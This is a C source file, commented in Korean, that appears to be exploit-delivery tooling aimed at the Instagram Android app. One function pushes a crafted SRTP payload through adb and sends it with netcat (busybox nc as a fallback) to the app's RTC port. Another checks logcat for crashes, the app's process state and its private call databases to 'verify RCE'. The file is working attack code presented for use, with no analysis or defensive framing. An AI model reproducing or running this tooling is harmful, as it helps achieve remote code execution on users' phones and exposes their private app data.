/*
 * ADB Payload Sender - Sends SRTP payload via Instagram RTC connection
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/* ADB를 통해 Instagram 앱의 RTC 포트에 데이터 전송 */
int adb_send_srtp_payload(const char *target_ip, uint16_t target_port,
                         const uint8_t *srtp_packet, size_t packet_size) {
    
    printf("\n[*] === ADB Payload Sender ===\n");
    printf("[*] 대상: %s:%u\n", target_ip, target_port);
    printf("[*] 페이로드 크기: %zu bytes\n", packet_size);
    
    /* 방법 1: nc (netcat) 사용 */
    char temp_file[] = "/tmp/srtp_payload.bin";
    FILE *fp = fopen(temp_file, "wb");
    if (!fp) {
        printf("[-] 임시 파일 생성 실패\n");
        return -1;
    }
    
    fwrite(srtp_packet, 1, packet_size, fp);
    fclose(fp);
    
    printf("[+] 페이로드 임시 저장됨\n");
    
    /* ADB를 통해 전송 */
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "adb push %s /data/local/tmp/srtp.bin && "
        "adb shell 'cat /data/local/tmp/srtp.bin | nc -u %s %u'",
        temp_file, target_ip, target_port);
    
    printf("[*] ADB를 통해 SRTP 패킷 전송 중...\n");
    
    if (system(cmd) != 0) {
        printf("[!] nc 전송 실패, 대체 방법 시도\n");
        
        /* 방법 2: busybox 또는 dd 사용 */
        snprintf(cmd, sizeof(cmd),
            "adb push %s /data/local/tmp/srtp.bin && "
            "adb shell 'dd if=/data/local/tmp/srtp.bin | "
            "busybox nc -u %s %u'",
            temp_file, target_ip, target_port);
        
        if (system(cmd) != 0) {
            printf("[-] SRTP 페이로드 전송 실패\n");
            unlink(temp_file);
            return -1;
        }
    }
    
    printf("[+] SRTP 페이로드 전송 완료\n");
    printf("[*] Instagram 앱이 패킷을 처리 중...\n");
    
    unlink(temp_file);
    
    return 0;
}

/* ADB를 통해 RCE 검증 */
int adb_verify_rce(void) {
    printf("\n[*] === RCE 검증 ===\n");
    
    /* logcat 모니터링 */
    printf("[*] logcat에서 crash 신호 검색 중...\n");
    printf("[*] (3초 대기)\n");
    
    sleep(1);
    
    /* crash 신호 확인 */
    system("adb logcat -d | grep -E 'signal|SIGSEGV|crash|FATAL' | tail -5");
    
    /* 프로세스 상태 확인 */
    printf("\n[*] Instagram 프로세스 상태:\n");
    system("adb shell ps | grep com.instagram.android");
    
    /* 통화 기록 확인 */
    printf("\n[*] 통화 기록 확인:\n");
    system("adb shell ls -la /data/data/com.instagram.android/databases/ 2>/dev/null | grep -i call");
    
    printf("\n[+] RCE 검증 완료\n");
    
    return 0;
}
